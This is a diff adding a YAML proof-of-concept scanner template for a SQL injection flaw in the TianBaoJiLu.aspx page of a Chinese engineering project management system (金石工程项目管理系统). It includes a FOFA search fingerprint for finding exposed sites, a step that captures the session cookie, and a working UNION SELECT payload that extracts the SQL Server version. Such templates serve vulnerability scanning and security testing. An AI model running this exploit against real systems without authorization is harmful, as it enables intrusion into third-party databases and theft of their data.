@@ -1,0 +1,36 @@
+id: poc-yaml-jinshi-engineering-project-management-software
+info:
+  name: 金石工程项目管理系统 TianBaoJiLu.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金石工程项目管理系统
+  fofa: body="金石工程项目管理系统"
+requests:
+- method: GET
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'status_code == 200 &&
+
+    contains(headers,"ASP.NET_SessionId")
+
+    '
+  output:
+  - regex_match(headers,"ASP.NET_SessionId=(?P<t1>.*?);")
+- method: GET
+  path: /query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+Union+Select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,@@version,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43+
+  headers:
+    Cookie: ASP.NET_SessionId={{.t1}};
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'status_code == 200 &&
+
+    contains(body,"microsoft sql server") &&
+
+    contains(body,"Corporation") &&
+
+    contains(headers,"text/html")
+
+    '
+variables: {}
+transport: http
